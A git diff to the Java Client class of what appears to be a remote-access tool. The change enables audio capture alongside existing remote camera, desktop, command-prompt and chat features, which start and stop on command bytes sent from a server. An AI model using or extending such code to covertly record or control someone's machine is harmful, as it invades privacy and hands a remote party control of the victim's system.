@@ -17,6 +17,8 @@ import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
+import static Tools.Globals.Sleep;
+
 public class Client extends NetworkInterface {
 
     public static void main(String[] args) throws SocketException, ClassNotFoundException, UnsupportedLookAndFeelException, InstantiationException, IllegalAccessException {
@@ -34,7 +36,7 @@ public class Client extends NetworkInterface {
     private final ObjectHandler<Message<?>> clientObjectHandler;
 
     private final CameraCapture cameraCapture;
-//    private final AudioCapture audioCapture = new AudioCapture();
+    private final AudioCapture audioCapture;
     private final Chat chat;
     private final CMDControl cmdControl;
     private final DesktopCapture desktopCapture;
@@ -49,6 +51,7 @@ public class Client extends NetworkInterface {
         desktopCapture = new DesktopCapture(new PacketHandler(socket, address, PORT));
         cmdControl = new CMDControl(new PacketHandler(socket, address, PORT));
         chat = new Chat(new PacketHandler(socket, address, PORT));
+        audioCapture = new AudioCapture(new PacketHandler(socket, address, PORT));
 
         threadListener.execute(listener());
     }
@@ -110,7 +113,8 @@ public class Client extends NetworkInterface {
                     switch (data[0]) {
                         case CommandByte.CAMERA_BYTE -> cameraCapture.startFeature();
                         case CommandByte.CAMERA_BYTE_STOP -> cameraCapture.stopFeature();
-//                        case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
+                        case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
+                        case CommandByte.AUDIOCAPTURE_BYTE_STOP -> audioCapture.stopFeature();
                         case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
                         case CommandByte.CMDCONTROL_BYTE_STOP -> cmdControl.stopFeature();
                         case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
